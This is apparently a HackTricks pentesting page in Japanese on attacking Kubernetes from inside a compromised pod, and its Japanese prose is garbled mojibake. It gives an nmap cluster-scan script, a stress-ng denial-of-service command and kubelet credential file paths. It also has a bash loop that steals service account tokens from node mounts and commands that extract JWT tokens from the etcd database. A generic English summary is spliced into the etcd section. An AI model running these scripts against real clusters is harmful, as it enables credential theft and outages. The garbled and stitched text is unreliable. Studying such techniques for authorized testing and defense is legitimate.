# Podå†…ã‹ã‚‰Kubernetesã¸ã®æ”»æ’ƒ

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **Pod Breakout**

**é‹ãŒè‰¯ã‘ã‚Œã°ã€ãã‚Œã‹ã‚‰ãƒãƒ¼ãƒ‰ã«è„±å‡ºã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### ãƒãƒƒãƒ‰ã‹ã‚‰ã®è„±å‡º

ãƒãƒƒãƒ‰ã‹ã‚‰è„±å‡ºã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**ç‰¹æ¨©ã‚’æ˜‡æ ¼**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ãŸã‚ã®ã„ãã¤ã‹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

çŠ¯ã—ãŸãƒãƒƒãƒ‰ã‹ã‚‰è„±å‡ºã—ã‚ˆã†ã¨ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®**docker breakouts**ã‚’ãƒã‚§ãƒƒã‚¯ã§ãã¾ã™ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetesæ¨©é™ã®ä¹±ç”¨

**Kubernetesåˆ—æŒ™**ã«é–¢ã™ã‚‹ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ã€ãƒãƒƒãƒ‰ã¯ãã®ä¸­ã«**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³**ã‚’æŒã£ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯ã€**æ¨©é™ãŒä»˜ä¸**ã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã€ã“ã‚Œã‚’**ä¹±ç”¨**ã—ã¦ä»–ã®ãƒãƒƒãƒ‰ã«**ç§»å‹•**ã—ãŸã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§æ§‹æˆã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ã‚¯ãƒ©ã‚¦ãƒ‰æ¨©é™ã®ä¹±ç”¨

ãƒãƒƒãƒ‰ãŒ**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒ**å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒªãƒ¼ã‚¯**ã—ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## è„†å¼±ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®æ¤œç´¢

Kubernetesç’°å¢ƒå†…ã«ã„ã‚‹ãŸã‚ã€ç¾åœ¨ã®ãƒãƒƒãƒ‰ã®æ¨©é™ã‚’ä¹±ç”¨ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ããšã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã™ã‚‹ã“ã¨ãŒã§ããªã„å ´åˆã¯ã€**æ½œåœ¨çš„ã«è„†å¼±ãªã‚µãƒ¼ãƒ“ã‚¹ã‚’æ¤œç´¢**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹

**ã“ã®ç›®çš„ã®ãŸã‚ã«ã€Kubernetesç’°å¢ƒã®ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å–å¾—ã—ã‚ˆã†ã¨ã§ãã¾ã™ï¼š**
```
kubectl get svc --all-namespaces
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Kubernetesã¯ãƒ•ãƒ©ãƒƒãƒˆãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€**ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»»æ„ã®ãƒãƒƒãƒ‰/ã‚µãƒ¼ãƒ“ã‚¹ãŒä»–ã®ãƒãƒƒãƒ‰/ã‚µãƒ¼ãƒ“ã‚¹ã¨é€šä¿¡ã§ãã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®**ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹**ã«ã¯ã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãŒã‚ã‚Šã¾ã›ã‚“**ã€‚ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹å†…ã®èª°ã‚‚ãŒä»–ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã¨é€šä¿¡ã§ãã¾ã™ã€‚

### ã‚¹ã‚­ãƒ£ãƒ³

ä»¥ä¸‹ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆ[Kubernetesãƒ¯ãƒ¼ã‚¯ã‚·ãƒ§ãƒƒãƒ—](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ã‹ã‚‰å–å¾—ï¼‰ã¯ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ã®IPç¯„å›²ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**Kuberneteså›ºæœ‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ”»æ’ƒ**ã—ã¦**ä»–ã®ãƒãƒƒãƒ‰/ç’°å¢ƒå…¨ä½“ã‚’ä¾µå®³**ã™ã‚‹æ–¹æ³•ã‚’å­¦ã‚“ã§ãã ã•ã„ï¼š

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

**ä¾µå®³ã•ã‚ŒãŸãƒãƒƒãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€ä»–ã®ãƒãƒƒãƒ‰ãŒèªè¨¼ã™ã‚‹å¿…è¦ãŒã‚ã‚‹**æ©Ÿå¯†ã‚µãƒ¼ãƒ“ã‚¹**ã®å ´åˆã€**ãƒ­ãƒ¼ã‚«ãƒ«é€šä¿¡ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã—ã¦ä»–ã®ãƒãƒƒãƒ‰ã‹ã‚‰é€ä¿¡ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ»ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼ˆãŠã‚ˆã³ãã‚Œã«ã‚ˆã‚‹**DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼‰ãªã©ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒKubernetesãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§æ©Ÿèƒ½ã—ã¾ã™ã€‚ãã®å¾Œã€ãƒãƒƒãƒ‰å†…ã§ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§å­˜åœ¨ã™ã‚‹**NET\_RAWæ©Ÿèƒ½**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ã‚«ã‚¹ã‚¿ãƒ ã«ä½œæˆã—ãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã€**åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ãŸMitMæ”»æ’ƒã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€**æ‚ªæ„ã®ã‚ã‚‹ãƒãƒƒãƒ‰**ãŒ**DNSã‚µãƒ¼ãƒãƒ¼ã¨åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œ**ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒ**ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ãƒãƒ¼ãƒ‰DoS

Kubernetesãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã«ãƒªã‚½ãƒ¼ã‚¹ã®ä»•æ§˜ãŒãªãã€ã‚³ãƒ³ãƒ†ãƒŠã«**é©ç”¨ã•ã‚Œã¦ã„ãªã„åˆ¶é™**ç¯„å›²ãŒãªã„å ´åˆã€æ”»æ’ƒè€…ã¨ã—ã¦ã€**ãƒãƒƒãƒ‰/ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’ã™ã¹ã¦æ¶ˆè²»**ã—ã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¯æ¸‡ã•ã›ã€ç’°å¢ƒã«DoSã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng`ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹é–“ã¨ãã®å¾Œã®é•ã„ãŒã‚ã‹ã‚Šã¾ã™
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ãƒãƒ¼ãƒ‰ã®ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã«æˆåŠŸã—ãŸå ´åˆã€ãƒãƒ¼ãƒ‰å†…ã§æ¬¡ã®èˆˆå‘³æ·±ã„æƒ…å ±ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š

- **ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ **ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆDockerï¼‰
- ã“ã®ã‚ˆã†ãªä»–ã®**ãƒãƒƒãƒ‰/ã‚³ãƒ³ãƒ†ãƒŠ**ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒãƒ¼ãƒ‰ï¼ˆè¿½åŠ ã®ãƒˆãƒ¼ã‚¯ãƒ³ï¼‰
- å…¨ä½“ã®**ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ **ãŠã‚ˆã³ä¸€èˆ¬çš„ãª**OS**
- ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹**Kube-Proxy**ã‚µãƒ¼ãƒ“ã‚¹
- ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹**Kubelet**ã‚µãƒ¼ãƒ“ã‚¹ã€‚æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
  - ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼š`/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- ãã®ä»–ã®**Kuberneteså…±é€šãƒ•ã‚¡ã‚¤ãƒ«**ï¼š
  - `$HOME/.kube/config` - **ãƒ¦ãƒ¼ã‚¶ãƒ¼æ§‹æˆ**
  - `/etc/kubernetes/kubelet.conf`- **é€šå¸¸ã®æ§‹æˆ**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **ãƒ–ãƒ¼ãƒˆã‚¹ãƒˆãƒ©ãƒƒãƒ—æ§‹æˆ**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcdæ§‹æˆ**
  - `/etc/kubernetes/pki` - **Kubernetesã‚­ãƒ¼**

### ãƒãƒ¼ãƒ‰ã®kubeconfigã‚’è¦‹ã¤ã‘ã‚‹

ä»¥å‰ã«ã‚³ãƒ¡ãƒ³ãƒˆã•ã‚ŒãŸãƒ‘ã‚¹ã®ã„ãšã‚Œã‹ã«kubeconfigãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€kubeletãƒ—ãƒ­ã‚»ã‚¹ã®å¼•æ•°`--kubeconfig`ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### ç§˜å¯†ã®ç›—ã¿å–ã‚Š
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
ã‚¹ã‚¯ãƒªãƒ—ãƒˆ[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)ã¯ã€è‡ªå‹•çš„ã«**ä»–ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€1ã¤ãšã¤ç¢ºèªã™ã‚‹ä»£ã‚ã‚Šã«ã€æ¢ã—ã¦ã„ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯**ã—ã¾ã™ï¼š
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æ¨©ã‚’æŒã¤DaemonSets

DaemonSetã¯ã‚¯ãƒ©ã‚¹ã‚¿ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹**ãƒãƒƒãƒ‰**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€DaemonSetãŒ**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã§æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰**ã§ãã®**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã®**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã¯å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒã˜ã§ã™ãŒã€ä»Šå›ã¯é‹ã«å·¦å³ã•ã‚Œã¾ã›ã‚“ã€‚

### ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ãƒ”ãƒœãƒƒãƒˆ

ã‚¯ãƒ©ã‚¹ã‚¿ãŒã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã€**ãƒãƒ¼ãƒ‰**ã¯ãƒãƒƒãƒ‰ã¨ã¯ç•°ãªã‚‹ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ï¼ˆã¾ãŸã¯hostNetworkã‚’Trueã«è¨­å®šã—ãŸãƒãƒƒãƒ‰ã‹ã‚‰ï¼‰:

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcdã®ç›—ã¿å‡ºã—

ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã™ã‚‹ãƒãƒ¼ãƒ‰ã®[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ã‚’æŒ‡å®šã§ãã‚‹å ´åˆã¯ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰å†…ã§ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã‚’å–å¾—ã—ã¦ãã ã•ã„ã€‚
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane ãƒãƒ¼ãƒ‰ã«ã¯ **role master** ãŒã‚ã‚Šã€**ã‚¯ãƒ©ã‚¦ãƒ‰ç®¡ç†ã‚¯ãƒ©ã‚¹ã‚¿ã§ã¯ãã‚Œã‚‰ã§ä½•ã‚‚å®Ÿè¡Œã§ãã¾ã›ã‚“**ã€‚

#### etcd ã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹

ãƒãƒƒãƒ‰ã®ã‚¹ãƒšãƒƒã‚¯ã§ `nodeName` ã‚»ãƒ¬ã‚¯ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹å ´åˆã€`etcd` ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç°¡å˜ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ã®ã™ã¹ã¦ã®æ§‹æˆã¨ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ `etcd` ã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã‚¯ã‚¤ãƒƒã‚¯ã§æ±šã„æ–¹æ³•ã§ã™ã€‚`etcd` ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ `etcdctl` ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã—ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œä¸­ã® `etcd` ã«æ¥ç¶šã™ã‚‹ã‚ˆã‚Šã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆãªã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ãŒå¿…è¦ãªå ´åˆã¯ã€@mauilion ã® [ã“ã®ä¾‹ã®ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆ](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚

**ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§ `etcd` ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼ˆã“ã‚Œã¯ `kubeadm` ã§ä½œæˆã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ã‚¿ã®å ´åˆã§ã™ï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a pod within a Kubernetes cluster, they are in a privileged position to carry out further attacks. This section explores various techniques that an attacker can use to escalate privileges and move laterally within the cluster.

### Escalating Privileges

#### Accessing the Kubernetes API

If the pod has a service account token mounted, the attacker can use it to access the Kubernetes API and potentially gain more control over the cluster.

#### Exploiting Misconfigurations

Attackers can look for misconfigurations within the cluster that may allow them to escalate privileges. For example, they can search for exposed credentials or insecure pod configurations.

### Moving Laterally

#### Pod Hopping

Attackers can move laterally by compromising one pod and then using it as a stepping stone to attack other pods within the cluster.

#### Accessing Secrets

Once inside a pod, attackers can search for and access sensitive information such as API keys, passwords, or other secrets stored within the cluster.

### Conclusion

Securing pods within a Kubernetes cluster is crucial to prevent attackers from escalating privileges and moving laterally within the cluster. Regular security assessments and audits can help identify and mitigate potential vulnerabilities.
```
```bash
data-dir=/var/lib/etcd
```
**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã™ã‚‹ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆåã‚’è¡¨ç¤ºã—ã¾ã™**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
